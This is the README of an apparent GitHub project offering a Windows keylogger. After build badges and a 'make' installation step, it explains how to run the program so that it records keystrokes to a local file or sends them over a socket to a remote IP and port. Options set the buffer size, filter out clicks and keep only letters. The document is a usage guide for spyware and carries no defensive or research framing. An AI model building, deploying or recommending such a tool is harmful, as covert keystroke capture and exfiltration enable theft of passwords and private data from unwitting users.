[![Codacy Badge](https://api.codacy.com/project/badge/Grade/bdc8da5ad85e41e9a17f59f6886b44a1)](https://www.codacy.com/manual/Harkame/Keylogger?utm_source=github.com&amp;utm_medium=referral&amp;utm_content=Harkame/Keylogger&amp;utm_campaign=Badge_Grade)
[![Maintainability](https://api.codeclimate.com/v1/badges/b64990488d63bf69de10/maintainability)](https://codeclimate.com/github/Harkame/Keylogger/maintainability)

# Keylogger

## Installation

``` bash

make

```
## Dependencies

-   Windows

## Usage

This program propose 2 type of keylogger

## Parameters/Options

### [REQUIERED] Please, choose one of them

        -l | --local : local keylogger, store data into file on this computer, require 1 argument (destination_file)
                Example : ./bin/main.exe -l D:\file.txt

        -r | --remote : remote keylogger, send data via socket, require 2 arguments (ip, port)
                Example : ./bin/main.exe -r 192.168.1.16 7777

### [OPTIONAL]

        -b | --buffer_size : Buffer size before store data (file or socket) (DEFAULT : 50)
                Example : ./bin/main.exe ... -b 100

        -c | --no_click : don't store click keys (based on ascii)
                Example : ./bin/main.exe ... -c

        -a | --alphabet_only : Store alphabet only, A-z (based on ascii)
                Example : ./bin/main.exe ... -a

        -C | --storage_format_character : Default storage format is int, use this option if you want to store as character
                Example : ./bin/main.exe ... -C

        -h | --help : Show this help
                Example : ./bin/main.exe -h
